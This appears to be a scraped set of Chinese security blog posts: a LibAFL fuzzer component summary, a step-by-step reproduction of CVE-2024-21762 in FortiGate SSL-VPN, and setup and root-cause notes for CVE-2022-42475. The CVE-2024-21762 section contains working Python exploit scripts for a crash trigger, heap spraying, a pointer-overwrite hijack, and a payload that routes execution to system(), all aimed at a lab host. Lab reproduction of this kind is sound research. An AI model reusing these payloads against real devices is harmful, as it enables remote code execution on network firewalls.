HasScheduler:描述:表明一个结构体持有一个Scheduler(调度器)实例。调度器负责决定下一个应该从语料库中选择哪个输入进行Fuzzing。核心要点回顾:Fuzzer(特别是StdFuzzer)是LibAFL的指挥中心，它整合了所有其他组件（State,EventManager,Executor,Feedback,Scheduler,Stages）来执行Fuzzing任务。它负责驱动Fuzzing循环，包括选择输入、执行输入、评估结果、更新语料库和状态。通过一系列Traits(如Evaluator,EventProcessor,ExecutesInput)，Fuzzer的行为和职责被清晰地定义和模块化。输入过滤器(如BloomInputFilter)可以帮助提高效率，避免重复工作。executorsExecutor是LibAFLFuzzing框架中负责接收输入(Input)，并在目标程序中实际执行这个输入的组件。它是Fuzzer与被测目标交互的桥梁，负责启动目标、传递输入、监控执行过程，并最终报告执行结果（如ExitKind：正常退出、崩溃、超时等）。核心理念:Executor的核心任务是将Fuzzer生成的或选择的输入“喂”给目标程序，并观察其行为。LibAFL提供了多种Executor实现，以适应不同的目标程序类型（如命令行工具、库函数、QEMU模拟的程序）和不同的Fuzzing策略（如进程内执行、基于fork/forkserver的执行、差分Fuzzing等）。一、ExecutorTrait(核心接口)定义了所有执行器的基本行为和契约。其核心方法通常是run_target(...)或类似名称，该方法接收一个输入，在目标程序中执行它，并返回一个ExitKind来指示执行是如何结束的。二、主要的Executor类型/模块inprocess(进程内执行器):InProcessExecutor:类似libFuzzer，直接在Fuzzer自身的进程空间内调用一个目标函数(harnessfunction)。优点:速度快，无进程切换开销。缺点:目标崩溃会导致Fuzzer进程一同崩溃，通常需要配合可重启的事件管理器(RestartingEventManager)。inprocess_fork(进程内Fork执行器):GenericInProcessForkExecutor:在每次执行harness函数前，Fuzzer主进程会调用fork()创建一个子进程，实际的目标函数调用在子进程中进行。优点:目标崩溃仅影响子进程，主Fuzzer安全。缺点:每次fork()仍有开销，通常比forkserver慢。forkserver(Forkserver执行器):AFL经典模式:目标程序启动后进入一个特殊的&quot;forkserver&quot;模式。Fuzzer命令此服务器fork()子进程来执行每个输入。优点:目标程序的核心初始化仅发生一次，后续fork()开销极小，效率高。适用性:通常需要目标程序经过AFL工具链插桩以支持forkserver。command(命令执行器):执行外部程序:为每次运行启动一个独立的子程序（如命令行工具），通过标准输入、文件或命令行参数传递输入。适用性:Fuzz独立的命令行应用。differential(差分执行器):比较不同版本:同时或先后执行两个或多个不同版本/配置的目标程序，并比较它们的行为差异。目标:发现回归性bug或版本间的行为不一致。combined(组合执行器):CombinedExecutor:包装一个主执行器和一个次执行器，但次执行器不在run_target中执行。用于主副执行器逻辑分离的特定场景。shadow(影子执行器):ShadowExecutor:包装一个主执行器，目的是配合一组**“影子观察者”(ShadowObservers)**工作。影子观察者:任何标准的Observer(如CmpLogObserver)都可以作为影子观察者，它们收集的信息不直接用于主Feedback循环的决策。作用:允许在不干扰核心Fuzzing逻辑的情况下，独立收集额外的、可能更专门或开销更大的观测数据（例如，CmpLog数据用于指导后续变异）。“影子”含义:指的是一种并行但独立于主反馈决策流程的观察路径。hooks(执行器钩子):扩展执行流程:提供在执行器运行harness函数之前和之后插入自定义代码的钩子点。sand(SAND执行器):低开销污点分析解耦:实现SAND技术，旨在将动态分析（如Sanitizer）的开销与Fuzzing主循环分离开，以提高Fuzzing效率。with_observers(带观察者的执行器包装器):添加HasObservers能力:包装任何Executor，使其能够持有观察者元组(ObserversTuple)并实现HasObserversTrait。三、核心枚举(Enums)ExitKind:指示执行结果:目标程序一次执行的结束状态。常见类型:Ok(正常),Crash(崩溃),Timeout(超时),OOM(内存溢出)。DiffExitKind:用于差分Fuzzing:描述差分执行中某个版本的具体退出类型。四、核心Traits(接口/规范)Executor:主要执行器接口，定义执行输入的核心功能。ExecutorsTuple:允许组合多个执行器。HasObservers:表明执行器持有观察者。Executor在执行后会通知Observer收集信息。HasTimeout:允许获取或设置Executor的超时阈值。五、辅助函数(Functions)common_signals:可能包含Fuzzer希望处理的常见操作系统信号列表。核心要点回顾:Executor是实际运行目标程序并应用输入的组件。LibAFL提供多种Executor以适应不同目标和策略。ExitKind是报告执行结果的关键。Executor与Observers紧密协作，在执行后由Observers收集数据。forkservervsinprocess_fork:inprocess_fork:Fuzzer主进程每次都fork()，子进程调用harness。forkserver:目标程序自身变成fork服务器，Fuzzer命令它fork()，初始化开销小，效率通常更高。ShadowExecutor与ShadowObservers:ShadowExecutor允许一组“影子观察者”独立于主反馈循环收集额外数据。任何Observer都可以充当影子观察者，如CmpLogObserver，其数据主要用于指导后续变异而非立即的“有趣性”判断。LibAFL简短介绍方便向面试官讲解的，感觉写的还是不够通俗，很多面试官其实并不了解，甚至有的不知道模糊测试的概念，后续可能也应该添加上LibAFL是一个Fuzz框架，它的核心理念是模块化、可组合性、高性能、可扩展性。它主要是提供了一个灵活的框架，让我们可以方便地构建定制化的Fuzzer，而不需要从零开始。Fuzzer最核心的部分是Fuzzer，是整个Fuzzing活动(fuzzcampaign)的主要控制中心和执行者。它将所有其他核心组件有机地组织和驱动起来，以执行完整的Fuzzing循环。以StdFuzzer为例，这也是LibAFL提供的一个默认、标准的Fuzzer实例，主要的流程就是从调度器(Scheduler)获取下一个要测试的输入，执行该输入（通过Executor），评估执行结果（通过Feedback和Observers），并将有趣的输入添加回语料库(Corpus)。但虽然创建的时候，标准StdFuzzer的new方法需要的三个参数为我刚刚说的scheduler,feedback,objective，但具体循环执行的loop方法中，其实用到了更顶层的一些模块，比如stages、executor、state、eventmanager让我们先从state说起stateState是LibAFLFuzzing框架的核心数据中心和状态管理器。它在整个Fuzzing运行期间负责跟踪、存储和管理所有动态数据、配置以及Fuzzing进度。几乎所有其他LibAFL组件（如Fuzzer核心、EventManager、Executor、Feedback、Corpus、Mutator、Stage）都会与State进行交互。stages一个Stage代表Fuzzing过程中的一个不同操作步骤或技术。它通常针对语料库(Corpus)中的单个输入（测试用例）进行处理，目的是分析、修改该输入，或者利用它来创造新的、有趣的测试用例，或为现有测试用例添加元数据。可以将Fuzzing过程看作一个流水线，每个Stage是流水线中的一个环节。这里有很多有趣的部分，最常见的就是mutational变异阶段，核心步骤就是获取输入，使用Mutators(变异器)进行多次随机变异，执行变异后的输入，并由Feedbacks(反馈)评估是否“有趣”(如产生新覆盖或崩溃)。其他还有power，它可以根据“能量”或优先级分配Fuzzing精力（如变异次数）给不同的输入，一般在CalibrationStage之后。至于calibrate，主要就是收集目标执行的初始指标，如平均执行时间、初始覆盖图状态/大小，为后续的Feedback和Scheduler提供基准数据。其他还有tracing，追踪目标执行，用元数据（如CmpLog比较日志）丰富测试用例。shadow，这个我用的不多，感觉主要就是独立于主执行路径之外，一般我配合cmplog用generation，生成新输入eventsmanagerEventManager是LibAFL中负责通信和协调的核心组件。它管理Fuzzer实例之间或Fuzzer内部组件之间的事件流。这些事件可以是新发现的测试用例、代码覆盖信息、统计数据、崩溃报告、日志消息等。最简单的就是simple，主要用来日志输出别的感觉用来多线程或者多个物理机同步多一点还有Launcher，用来并行启动和管理多个Fuzzer实例的其他就是实现主从架构的多一点还有scheduler，Fuzzer新建实例的时候的必需品Scheduler决定了Fuzzer如何以及按什么顺序从语料库(Corpus)中选择下一个测试用例(Testcase)进行Fuzzing。我认为它核心的理念就是通过智能地选择和排序语料库中的输入，最大化Fuzzing的效果，避免在低价值的输入上浪费过多的时间和计算资源。最简单的就是queue，对列调度，先进先出嘛还有power，能量调度，给语料库输入根据覆盖率还有执行时间什么的分配能量，按能量提高输入被选中的概率accounting进行更细致的覆盖率审计，以确保Fuzzer在所有已发现的路径上都花费了足够的精力，并优先探索那些能够覆盖到“稀有”或“昂贵”路径的输入。还有纯靠概率的，提高随机性其他好像还有打分的，加权的，差不多就这些吧executorLibAFL中接收输入(Input)，并在目标程序中实际执行这个输入的组件，我觉得还是起一个桥梁作用，负责启动目标、传递输入、监控执行过程，并最终报告执行结果具体来说，感觉就三种最常用的，比如InProcessExecutor，类似libFuzzer，直接在Fuzzer自身的进程空间内调用一个目标函数(harnessfunction)。速度快，无进程切换开销，但目标崩溃会导致Fuzzer进程一同崩溃，通常需要配合可重启的事件管理器InprocessForkExecutor每次执行harness函数前，Fuzzer主进程会调用fork()创建一个子进程，实际的目标函数调用在子进程中进行。这就让目标崩溃只影响子进程，但每次fork()仍有开销，通常比forkserver慢。forkserver目标程序启动后进入一个特殊的&quot;forkserver&quot;模式。Fuzzer命令此服务器fork()子进程来执行每个输入。目标程序的核心初始化仅发生一次，后续fork()开销极小，效率高。别的好像用的就不是很多了，哦，还有shadow，配合shadowobserver工作，用来指导变异别的好像就剩observer跟monitor、feedback了monitor最好说，就是显示信息嘛observer主要用来观察，最重要的当然是mapmapobserver主要观察一块共享内存区域（“地图”），这块地图由被插桩的目标程序在执行时更新，用以记录代码执行信息，最常见的是代码覆盖率。其他还有cmp，就是记录cmplog，然后结合上面的executor对Mutator做指导，比如我们程序比较A=B的时候，它会偷偷把A跟B记下来，马上输入直接给你换成A或者B这样还有concolic，符号化执行与具体执行相结合，记录执行路径，然后求解分析条件，找到新值哦，还有Mutator，对输入进行修改和转换基础的就是字节基本变异还有havoc变异别的就是基于token的变异，这里可以配合cmplog进行别的还有mopt变异还有语法感知变异还有学习输入结构，生成符合结构的变异输入还有feedback，判断输入是否有趣的基于代码覆盖率基于执行退出基于时间基于特定值/模式","link":"https://augu5tu.github.io/post/libafl-summary/"},{"title":"CVE-2024-21762 漏洞复现","content":"静态分析这是一个越界写入漏洞，根据前期调研，可以用chunklength字段传入很多个0，0的长度大于剩余缓冲区长度的1/2时，就会触发越界写入找到漏洞位置这里与修复后版本进行对比，发现主要有两个修改点解析chunk格式时，，检查分块长度是否大于16，大于16认为是非法的chunklength。读取chunktrailer（数据传输结束标志，大小为0的块）时，写入\\r\\n的偏移line_off的赋值来源修复前line_off的值来源于*(_QWORD*)(a1+744)，修复后line_off为ap_getline的返回值。对具体代码进行分析if(ap_getline(*(a1+760),v26,*(*(a1+8)+40LL),1LL)&lt;=0){if(sub_16DCA50(*(*(a1+8)+40LL))-1&lt;=4)return-1LL;break;}这里先用ap_getline检查chunk长度，如果≤0，会继续检查，不通过会返回-1，结束sub_16DCA50简单分析了一下，根据动调一般不会有什么影响，大概是检查偏移160字节处的值，并将其转换和处理后返回（整数右移3位后，转换为16位整数，再转换为无符号32位整数）。如果传入的指针无效（即a1为零），则返回一个特殊值（4294967292LL）在检查结束以后，有一段代码v27=*(_DWORD*)(a1+752);//获取当前chunk剩余字节数line_off=*(_QWORD*)(a1+728);//当前行的偏移v29=v27-1;//减去1字节，可能用于处理行末的CRLFif(line_off!=v29){v30=*(_QWORD*)(a1+760);//缓冲区起始地址*(_QWORD*)(a1+728)=line_off+1;*(_BYTE*)(v30+line_off)=13;//写入0x0d(CR)v31=*(_QWORD*)(a1+728);//更新偏移v32=*(_QWORD*)(a1+760);//缓冲区起始地址*(_QWORD*)(a1+728)=v31+1;*(_BYTE*)(v32+v31)=10;//写入0x0a(LF)v29=*(_QWORD*)(a1+728);//更新偏移v27=*(_DWORD*)(a1+752);//更新chunk剩余字节数}大概逻辑为，在读取chunktrailer时，根据chunklength的字段，如果发现当前chunk已经处理完（即v27等于0），会在缓冲区适当位置写入0x0d（CR）和0x0a（LF），表示chunk的结束。总结：如果chunklength的字段解码后为0的话,就会从chunktrailer开始读,而chunktrailer是由ap_getline读取的读取chunktrailer的时候,会根据chunklength的长度写入0x0d,0x0a如果在chunklength上传入0的长度大于剩余缓冲区长度的1/2时,就会触发越界写0x0a0d通过栈回溯，查看上级函数，有如下内容charv4[8200];//[rsp+0h][rbp-2020h]BYREF因为是64位，可知偏移0x2028的位置保存了返回地址如果在0x202e处写入，那么0x2028处保存的返回地址的最后两个字节将会被替换因为大端寻址，原来应该是xxxxxx0d0a，最后应该成功触发溢出，并显示非法地址是0x0d0axxxxxx触发crash用一个简单的脚本触发crashimportsocketimportssldefcreat_ssock(hostname,port):context=ssl._create_unverified_context()sock=socket.create_connection((hostname,port))ssock=context.wrap_socket(sock,server_hostname=hostname)returnssockhostname='192.168.150.9'port=10443pkt=b&quot;&quot;&quot;\\GET/HTTP/1.1Host:%sTransfer-Encoding:chunked%s\\r\\n%s\\r\\n\\r\\n&quot;&quot;&quot;%(hostname.encode(),b&quot;0&quot;*((0x202e//2)-2),b&quot;a&quot;)ssock=creat_ssock(hostname,port)ssock.send(pkt)response=ssock.recv(4096)print(response.decode('utf-8'))ssock.close()漏洞利用尝试劫持rbp通过覆盖rbp的低字节，使rbp刚好指向可控的内存区域rbp为0x2020，写入0x2026个，则rbp地址最后两个字节会被覆盖为\\r\\n(0d0a)但尝试后发现，即使覆盖了栈上的rbp，也无法劫持rsp和rip，甚至程序不会产生崩溃向上回溯，找到sub_17F5AC0的父函数sub_180AA90，该函数在返回时并没有调用leaveret来恢复rsp，而是直接addrsp,0x18，因此无法达到预期的效果。堆喷方法但此函数在栈上保存了rbx、r12-r15五个寄存器的值，并在函数返回时恢复这些寄存器，继续回溯，可以看到r13中保存的正是参数a1。a1是一个结构体指针，通过调试也可以看出栈上保存的r13是一个堆地址。​如果通过越界写覆盖r13最后两个字节，那么sub_180AA90函数返回时恢复r13寄存器，就可以篡改a1指针的值。如果能够对堆内存进行布局，使得a1指向提前布置好的内存区域，那么就可以劫持整个a1结构体。​然后大概看了一下sub_1A27650和sub_1A26040的代码逻辑，感觉a1多级结构体成员的动态函数调用还挺多，这样劫持a1会有更多的利用机会。劫持结构体结构体大小获取需要堆喷来调整堆上结构的，所以首先要知道该结构体的大小一开始断点下错了，分析了一下调用链调用链分析尝试通过栈回溯查看，不能成功在此处下断点找到原因，此处预计判断条件错误，不会走到AB39（最后发现是请求脚本写错了）调用链：180C1B0180AA90从sub_180AA90返回到sub_180C1B0有如下语句.text:000000000180C1B0movedx,1.text:000000000180C1B5movesi,r14d.text:000000000180C1B8movrdi,r13.text:000000000180C1BBcallsub_180AA90.text:000000000180C1C0testeax,eax这里重新call了一遍sub_180AA90，并且传入的rdi是从r13来恢复的。该参数对应了一个大结构体。sub_180AA90在返回时从栈上恢复了r13，且通过动调可以发现r13的初始值位于堆上。.text:000000000180AB39loc_180AB39:;CODEXREF:sub_180AA90+342↓j.text:000000000180AB39;sub_180AA90+36A↓j....text:000000000180AB39addrsp,18h.text:000000000180AB3Dpoprbx.text:000000000180AB3Epopr12.text:000000000180AB40popr13.text:000000000180AB42popr14.text:000000000180AB44popr15.text:000000000180AB46poprbp.text:000000000180AB47retn.text:000000000180C288loc_180C288:;CODEXREF:sub_180C240+6D↓j.text:000000000180C288movrdi,r12.text:000000000180C28Bcallsub_181B8E0.text:000000000180C290movrdi,r12.text:000000000180C293movesi,r13d.text:000000000180C296movr12,rbx.text:000000000180C299callsub_180C0A0.text:000000000180C29Emovrax,[rbx+18h].text:000000000180C2A2learbx,[rax-18h].text:000000000180C2A6cmpr12,offsetqword_BF042C0.text:000000000180C2ADjnzshortloc_180C288查看结构体分配位置经过观察，可被劫持的r13保存的结构体在不同请求中的分配几乎都在同一个位置，因此可以直接下watch断点来找到它被分配的代码位置。pwndbg&gt;watch*0x7ff2b8c54800Hardwarewatchpoint4:*0x7ff2b8c54800断下来之后查看调用栈，发现是je_calloc开的空间找到je_calloc@plt调用位置后，下断点查看je_calloc原型如下void*je_calloc(size_tnmemb,size_tsize);所以结构体大小是0x730尝试布置堆块这里使用了一个GDB脚本在分配大小接近0x730时自动打印对je_malloc和je_calloc的调用bje_mallocif(($rdi&gt;=0x700)&amp;&amp;($rdi&lt;=0x800))commandssilentset$malloc_size=$rdicendb*(je_malloc+205)commandssilentif(($malloc_size&gt;=0x700)&amp;&amp;($malloc_size&lt;=0x800))printf&quot;je_malloc:%p:%p:%d\\n&quot;,$rax,($rax+$malloc_size),$malloc_sizeset$malloc_size=0endcendbje_callocif(($rsi&gt;=0x700)&amp;&amp;($rsi&lt;=0x800))commandssilentset$calloc_size=$rsicendb*(je_calloc+340)commandssilentif(($calloc_size&gt;=0x700)&amp;&amp;($calloc_size&lt;=0x800))printf&quot;je_calloc:%p:%p:%d\\n&quot;,$rax,($rax+$calloc_size),$calloc_sizeset$calloc_size=0endcendset$malloc_size=0set$calloc_size=0只看到一个分配je_calloc:0x7f1ecfc54800:0x7f1ecfc54f30:1840从以前的攻击中知道，FortiGate在解析每个表单post参数时会创建单独的分配，所以感觉可以对具体分配控制的细一点，发了一个带五个参数的请求，每个参数长度都为目标分配大小。具体脚本importsocketimportssldefcreate_ssock(hostname,port):context=ssl._create_unverified_context()sock=socket.create_connection((hostname,port))ssock=context.wrap_socket(sock,server_hostname=hostname)returnssockhostname='192.168.150.9'port=10443#修改body内容body=(b&quot;A&quot;*1840+b&quot;=&amp;&quot;)*5#构造POST请求的数据data=b&quot;POST/remote/hostcheck_validateHTTP/1.1\\r\\n&quot;data+=b&quot;Host:192.168.1.229\\r\\n&quot;data+=b&quot;Content-Length:&quot;+str(len(body)).encode(&quot;utf-8&quot;)+b&quot;\\r\\n&quot;data+=b&quot;\\r\\n&quot;data+=body#创建SSL套接字并发送数据ssock=create_ssock(hostname,port)ssock.send(data)#接收响应response=ssock.recv(4096)print(response.decode('utf-8'))#关闭套接字ssock.close()结果如下je_calloc:0x7f1ecfc54800:0x7f1ecfc54f30:1840je_malloc:0x7f1eceff5800:0x7f1eceff5f50:1872je_malloc:0x7f1ecf016000:0x7f1ecf016750:1872je_malloc:0x7f1ecf015800:0x7f1ecf015f50:1872je_malloc:0x7f1ecf01e800:0x7f1ecf01ef50:1872je_malloc:0x7f1ecefdf800:0x7f1ecefdff50:1872je_malloc:0x7f1ecf01f800:0x7f1ecf01ff50:1872je_malloc:0x7f1ecf01d400:0x7f1ecf01db50:1872je_malloc:0x7f1ecf020800:0x7f1ecf020f50:1872je_malloc:0x7f1ecf01d800:0x7f1ecf01df50:1872malloc跟calloc大小不太一样，增加了32个字节（最后一列为10进制），但根据之前的分析，应该都能够分配大小相同（0x800）并且连续的堆块通过以上测试，调整一下大小，最终形成如下两个请求importsocketimportsslimporttimedefcreate_ssock(hostname,port):context=ssl._create_unverified_context()sock=socket.create_connection((hostname,port))ssock=context.wrap_socket(sock,server_hostname=hostname)returnssockTARGET='192.168.150.9'PORT=10443ssock1=create_ssock(TARGET,PORT)#布置堆块body=(b&quot;A&quot;*1901+b&quot;=&quot;+b&quot;B&quot;*1901+b&quot;&amp;&quot;)*15data=b&quot;POST/remote/hostcheck_validateHTTP/1.1\\r\\n&quot;data+=b&quot;Host:192.168.150.9\\r\\n&quot;data+=b&quot;Content-Length:&quot;+str(len(body)).encode(&quot;utf-8&quot;)+b&quot;\\r\\n&quot;data+=b&quot;\\r\\n&quot;data+=bodyssock1.sendall(data)time.sleep(1)ssock2=create_ssock(TARGET,PORT)data=b&quot;POST/HTTP/1.1\\r\\n&quot;data+=b&quot;Host:192.168.1.229\\r\\n&quot;data+=b&quot;Transfer-Encoding:chunked\\r\\n&quot;data+=b&quot;\\r\\n&quot;data+=b&quot;0&quot;*4120+b&quot;\\0&quot;data+=b&quot;A&quot;*1+b&quot;\\r\\n\\r\\n&quot;ssock2.sendall(data)第一个请求是为了布置堆第二个请求使用一开始计算的4120，在0x0a0d覆盖后下断点查看情况根据之前的梳理，sub_16E6130就是漏洞所在处，此处0x0a0d完成覆盖，选择在0x17f5af6处后下断点写入地址错误发现因为大端的问题，0x0a0d写入地址错误堆喷失败尝试进行调整，但调整成功以后发现没能成功喷到这里和同门讨论了一下，他用的另一种方法，溢出点不同，填充字符数量为4137，我尝试了一下确实成功了探究原因尝试探究了一下具体原因，根据我们一开始堆喷的思路，a1指针的低字节被覆盖成\\r\\n后，可以恰好指向预先布置好的内存。这里我简单画了个图：为实现这一效果，需要达成如下条件：a1结构体地址比堆喷区域地址更高，并且二者间隔很小。0x7fxxxxxxx0a0d一定指向伪造的结构体。我重新看了一下r13的地址和rbp寄存器，根据之前的调试经验，寄存器中地址在此处相对固定，跟r13相近的地址大概有如下几处也就是说，可用的偏移只有4137、4133、4121，这里我使用4121重新尝试了一下一开始堆喷没有成功喷到，堆喷成功率确实不是非常稳定继续尝试，成功劫持结构体又用4137尝试了一下，也能成功劫持这样就可以可靠地将r13指针重定向到能够控制的缓冲区。然后填充缓冲区，实现远程代码执行。最终劫持请求如下importsocketimportsslimporttimedefcreate_ssock(hostname,port):context=ssl._create_unverified_context()sock=socket.create_connection((hostname,port))ssock=context.wrap_socket(sock,server_hostname=hostname)returnssockTARGET='192.168.150.9'PORT=10443ssock1=create_ssock(TARGET,PORT)body=(b&quot;A&quot;*1901+b&quot;=&quot;+b&quot;B&quot;*1901+b&quot;&amp;&quot;)*15data=b&quot;POST/remote/hostcheck_validateHTTP/1.1\\r\\n&quot;data+=b&quot;Host:192.168.150.9\\r\\n&quot;data+=b&quot;Content-Length:&quot;+str(len(body)).encode(&quot;utf-8&quot;)+b&quot;\\r\\n&quot;data+=b&quot;\\r\\n&quot;data+=bodyssock1.sendall(data)time.sleep(1)ssock2=create_ssock(TARGET,PORT)data=b&quot;POST/HTTP/1.1\\r\\n&quot;data+=b&quot;Host:192.168.1.229\\r\\n&quot;data+=b&quot;Transfer-Encoding:chunked\\r\\n&quot;data+=b&quot;\\r\\n&quot;data+=b&quot;0&quot;*4121+b&quot;\\0&quot;#data+=b&quot;0&quot;*4140+b&quot;\\0&quot;data+=b&quot;A&quot;*1+b&quot;\\r\\n\\r\\n&quot;ssock2.sendall(data).plt:000000000043FDF0jmpcs:off_42616F8.plt:000000000043FDF0_systemendp000000000180AAAEmovr13,[rdi+298h]000000000180AAC3movr15,[r13+70h]000000000180AAFDmovrax,[rax+r15+20h]000000000180AB0Bcallrax.plt:000000000043FDF0jmpcs:off_42616F8.plt:000000000043FDF0_systemendp.got.plt:00000000042616F8off_42616F8dqoffsetsystem;DATAXREF:_system↑r这是最后一次解引用，所以我们有以下内容，分为两个步骤。tmp0=rax+r15+0x20(0x042616F8)rax=*tmp0(0x0043FDF0)callrax我们使用调试器逐步检查了代码，发现rax在这一点上通常是0x20，因此我们可以将其简化为以下内容。tmp0=r15+0x40(0x042616F8)rax=*tmp0(0x0043FDF0)callraxtmp1=r13+0x70(0x00432F70)r15=*tmp1(0x042616B8)tmp0=r15+0x40(0x042616F8)rax=*tmp0(0x0043FDF0)callrax0x042616F8-0x40=0x042616B8最后一步意味着我们只需要在rdi+0x298处写入0x00432F00。因为我们控制了rdi指向的地方，所以应该没有问题。tmp2=rdi+0x298r13=*tmp2(0x00432F00)tmp1=r13+0x70(0x00432F70)r15=*tmp1(0x042616B8)tmp0=r15+0x40(0x042616F8)rax=*tmp0(0x0043FDF0)callraxsystem_ptr=b&quot;%00%2f%43%00%00%00%00%00&quot;#0x00432F00body=(b&quot;B&quot;*1165+system_ptr+b&quot;B&quot;*713+b&quot;=&amp;&quot;)*25data=b&quot;POST/remote/hostcheck_validateHTTP/1.1\\r\\n&quot;data+=b&quot;Host:192.168.150.9\\r\\n&quot;data+=f&quot;Content-Length:{len(body)}\\r\\n&quot;.encode(&quot;utf-8&quot;)data+=b&quot;\\r\\n&quot;data+=body一开始没能成功堆喷成功走到callsystem，后面的步骤感觉就是和前两个漏洞一样，找gadget构造ROP，基本一致","link":"https://augu5tu.github.io/post/cve-2024-21762-reproduction/"},{"title":"CVE-2022-42475 复现 总结","content":"经历了快两三个月，终于将这个漏洞复现完成，中间因为无法联调的问题浪费了大部分时间，所幸拨得云开见月明，总结一下，希望给后面尝试复现这个漏洞的人一些帮助。搭载运行环境​第一步应该是下载FortiGate的虚拟机镜像，网上大部分教程都是7.2.4的版本，官网在不断地更新固件，这个版本可能不太好下载了，这里附一个7.2.4版本的ova，双击导入即可​导入后，网上许多教程建议将虚拟网卡绑到nat，事实上完全可以省去这一步骤，网络适配器可以选择性移除到只留一个（不移除也没有问题）​启动后，使用admin+空密码登录，然后设置新密码​由于上一步我们省去了绑定的步骤，所以这里需要运行一条命令获取虚拟机的IP地址，事实上，FortiGate防火墙上可用的命令并不多，而且和我们通常熟悉的命令并不相同，这也为我们后面的工作造成了一些障碍，言归正传，输入命令getsysteminterfacephysical，获取IP在浏览器中输入IP地址进行访问，找到VPN/SSL-VPNSettings，设置好SSL-VPN相关的内容如果有问题，可以访问这篇博客的配置部分，相当详细之后访问sslvpn的端口，就会出现vpn登录页面，我上面设置的端口是10443，ip是192.168.150.9，所以我应该访问192.168.150.9:10443，如果你能正确访问，那么下面的部分可以直接跳过但或许你会看到如下界面，请别紧张，有可能是你的配置错误，可以按照上面的步骤仔细检查，也有可能是tls版本的问题，在FortiGate官方文档中，写明支持tls1.3版本，但实际测试中没有相关选项，只有tls1.0这里我尝试使用edge浏览器的IE兼容模式，也不能连接，直到将tls1.0选项勾选才能看到web界面点击转到此网页环境搭建就此完成搭建调试和漏洞环境在7.2.3中，我们所想复现的这个漏洞已经被修复，所以需要通过二进制patch，去掉漏洞的补丁。提取二进制二进制程序位于虚拟机磁盘文件中，使用vmwareworkstation（Linux虚拟机）挂载fortinet虚拟机的磁盘文件，在虚拟机中挂载分区。这里我展示一下如何操作首先，VMware中找到FortiGate虚拟机（先关机），点击编辑虚拟机设置，找到较小的硬盘，复制文件地址然后使用另一台虚拟机（最好选择一台不是调试用的，这段操作你可能要重复很多次，建议一台常用虚拟机用于调试，一台用于完成文件操作，后一台在FortiGate虚拟机开启时关闭，这样就避免了频繁在虚拟机配置页面卸载装载硬盘），如法炮制，同样的界面，选择添加-&gt;硬盘-&gt;下一步-&gt;使用现有虚拟磁盘-&gt;将刚刚复制的磁盘地址粘贴到地址框内-&gt;点击完成这时候再开机，可以看到文件系统中存在FORTIOS分区​主要业务二进制位于FORTIOS分区的rootfs.gz打包文件中，如果你使用的是高版本Ubuntu系统，这里可以直接使用图形化界面完成解压操作，即右键-&gt;提取到，选择一个易于记忆的位置存放文件，如果不是，使用gzip+cpio解压后会出现结果.tar文件，使用rootfs下的xz和ftar解压这些文件。sudochroot./sbin/xz--check=sha256-d/bin.tar.xzsudochroot./sbin/ftar-xf/bin.tarsudochroot./sbin/xz--check=sha256-d/migadmin.tar.xzsudochroot./sbin/ftar-xf/migadmin.tarsudochroot./sbin/xz--check=sha256-d/usr.tar.xzsudochroot./sbin/ftar-xf/usr.tar搭建GDB调试环境​登录虚拟机console后，拿到的是一个受限的命令行界面，无法执行shell命令，我们需要通过patch文件系统和二进制来获取shell执行环境。这里可以直接看这篇博客，我不想写了在patch完，重打包，GDB调试Fortios系统内核的步骤中，你可能并不能像网上的许多博客一样可以成功下端点修改返回值，这里推荐看我的上一篇博客在启动以后，执行diagnosehardwaresmartctl命令，激活后门以后，执行getsysteminterfacephysical找到FortiGate的ip在FortiGate上开启一个调试端口，方便本地gdb远程连接到服务器上进行调试使用busyboxps-a命令查看所有的进程pid，确定sslvpn的pid，接着执行命令附加调试/#busyboxps-a|grepsslvpn250700:00/bin/sslvpnd271900:00grepsslvpn/#gdbserver:80--attach2507Attached;pid=2507Listeningonport80再在终端中开启GDB远程调试：gdb-peda$targetremote192.168.150.131:80漏洞分析漏洞探寻漏洞位于如下函数处：//这个函数负责从POST请求体中读取输入，其基本逻辑：//首先获取到用户提交的Content-Length值，传入pool_alloc函数中分配内存空间，之后使用memcpy将用户数据拷贝到刚刚分配的内存中。__int64__fastcallsslvpn_read_post_data_cb(_QWORD*a1){__int64*v1;//r12sslvpn_context*v2;//rax__int64v3;//rcxintv4;//r8dintv5;//r9dsslvpn_context*ctx;//rbx__int64v7;//raxsize_tv8;//r12signed__int64sock_buffer;//rdisigned__int64content_length;//raxsigned__int64v11;//r12char*v13;//raxv1=(__int64*)a1[92];v2=(sslvpn_context*)sub_181BDC0(a1[83]);ctx=v2;if(v2-&gt;content||(v13=pool_alloc(*v1,v2-&gt;content_length+1),(ctx-&gt;content=(uint64_t)v13)!=0)){v7=sub_16E6130((__int64)v1,(__int64)&amp;ctx[1],8190LL,v3,v4,v5);v8=v7;if(v7){if(v7&lt;0){if((unsignedint)sub_16DCA50(a1[77])-1&lt;=4)return0LL;}else{sock_buffer=ctx-&gt;sock_buffer;content_length=ctx-&gt;content_length;if((__int64)(sock_buffer+v8)&gt;content_length)v8=ctx-&gt;content_length-sock_buffer;if(sock_buffer&lt;content_length){memcpy((void*)(ctx-&gt;content+sock_buffer),&amp;ctx[1],v8);sock_buffer=ctx-&gt;sock_buffer;content_length=ctx-&gt;content_length;}v11=sock_buffer+v8;ctx-&gt;sock_buffer=v11;if(v11&lt;content_length)return0LL;}}return2LL;}return7LL;}最主要的是v13=pool_alloc(*v1,v2-&gt;content_length+1这里这里我使用的是7.2.4版本的FortiGate，此版本漏洞已经被修复完毕调用``pool_alloc`函数处汇编代码如下：.text:0000000001811128loc_1811128:;CODEXREF:sslvpn_read_post_data_cb+29↑j.text:0000000001811128movrax,[rax+18h].text:000000000181112Cmovrdi,[r12].text:0000000001811130learsi,[rax+1].text:0000000001811134callpool_alloc老版本此处调用代码如下：moveax,[rax+18h]//DWORD(ctx-&gt;content_length)movrdi,[r12]leaesi,[rax+1]//DWORD(ctx-&gt;content_length)+1movsxdrsi,esicallalloc在老版本中，当CL值被存入eax寄存器时，因为eax寄存器最多只能存储32位，以及后面会对地址进行拓展+1的操作，所以会存在溢出可能性，举例：当提供的content_length为0x1b00000000时，由于DWORD(ctx-&gt;content_length)=0，因此实际申请内存为1字节，而下面做内存拷贝时取到的content-length为0x1b00000000，从而导致堆溢出漏洞。但因为使用的不是老版本固件，所以需要进行patch，具体方式参考此文章这里我使用的师兄patch后的版本.text:0000000001811128loc_1811128:;CODEXREF:sslvpn_read_post_data_cb+29↑j.text:0000000001811128jmpshortloc_1811174.text:0000000001811128;---------------------------------------------------------------------------.text:000000000181112Aalign4.text:000000000181112Ccallqwordptr[rax-6F6F6F70h].text:0000000001811132nop.text:0000000001811133nop